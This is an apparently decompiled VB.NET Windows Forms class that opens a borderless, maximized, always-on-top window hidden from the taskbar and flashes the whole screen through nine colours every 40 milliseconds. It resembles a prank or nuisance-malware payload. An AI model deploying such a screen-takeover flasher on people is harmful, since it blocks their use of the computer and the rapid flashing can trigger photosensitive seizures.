Imports Microsoft.VisualBasic.CompilerServices
Imports System
Imports System.Collections.Generic
Imports System.ComponentModel
Imports System.Diagnostics
Imports System.Drawing
Imports System.Runtime.CompilerServices
Imports System.Windows.Forms

<DesignerGenerated> _
Public Class Form5
    Inherits Form
    ' Methods
    Public Sub New()
        AddHandler MyBase.Load, New EventHandler(AddressOf Me.Form5_Load)
        Dim list As List(Of WeakReference) = Form5.__ENCList
        SyncLock list
            Form5.__ENCList.Add(New WeakReference(Me))
        End SyncLock
        Me.z = 1
        Me.InitializeComponent
    End Sub

    <DebuggerNonUserCode> _
    Protected Overrides Sub Dispose(ByVal disposing As Boolean)
        Try 
            If (disposing AndAlso (Not Me.components Is Nothing)) Then
                Me.components.Dispose
            End If
        Finally
            MyBase.Dispose(disposing)
        End Try
    End Sub

    Private Sub Form5_Load(ByVal sender As Object, ByVal e As EventArgs)
    End Sub

    <DebuggerStepThrough> _
    Private Sub InitializeComponent()
        Me.components = New Container
        Me.Timer1 = New Timer(Me.components)
        Me.SuspendLayout
        Me.Timer1.Enabled = True
        Me.Timer1.Interval = 40
        Dim ef As New SizeF(6!, 13!)
        Me.AutoScaleDimensions = ef
        Me.AutoScaleMode = AutoScaleMode.Font
        Dim size As New Size(10, 10)
        Me.ClientSize = size
        Me.FormBorderStyle = FormBorderStyle.None
        Me.MaximizeBox = False
        Me.MinimizeBox = False
        Me.Name = "Form5"
        Me.ShowIcon = False
        Me.ShowInTaskbar = False
        Me.TopMost = True
        Me.WindowState = FormWindowState.Maximized
        Me.ResumeLayout(False)
    End Sub

    Private Sub Timer1_Tick(ByVal sender As Object, ByVal e As EventArgs)
        If (Me.z = 1) Then
            Me.BackColor = Color.Black
        ElseIf (Me.z = 2) Then
            Me.BackColor = Color.White
        ElseIf (Me.z = 3) Then
            Me.BackColor = Color.Red
        ElseIf (Me.z = 4) Then
            Me.BackColor = Color.Green
        ElseIf (Me.z = 5) Then
            Me.BackColor = Color.Blue
        ElseIf (Me.z = 6) Then
            Me.BackColor = Color.Yellow
        ElseIf (Me.z = 7) Then
            Me.BackColor = Color.Gray
        ElseIf (Me.z = 8) Then
            Me.BackColor = Color.Orange
        ElseIf (Me.z = 9) Then
            Me.BackColor = Color.Cyan
        End If
        If (Me.z > 9) Then
            Me.z = 1
        Else
            Me.z += 1
        End If
    End Sub


    ' Properties
    Friend Overridable Property Timer1 As Timer
        <DebuggerNonUserCode> _
        Get
            Return Me._Timer1
        End Get
        <MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode> _
        Set(ByVal WithEventsValue As Timer)
            Dim handler As EventHandler = New EventHandler(AddressOf Me.Timer1_Tick)
            If (Not Me._Timer1 Is Nothing) Then
                RemoveHandler Me._Timer1.Tick, handler
            End If
            Me._Timer1 = WithEventsValue
            If (Not Me._Timer1 Is Nothing) Then
                AddHandler Me._Timer1.Tick, handler
            End If
        End Set
    End Property


    ' Fields
    Private Shared __ENCList As List(Of WeakReference) = New List(Of WeakReference)
    <AccessedThroughProperty("Timer1")> _
    Private _Timer1 As Timer
    Private components As IContainer
    Private z As Integer
End Class


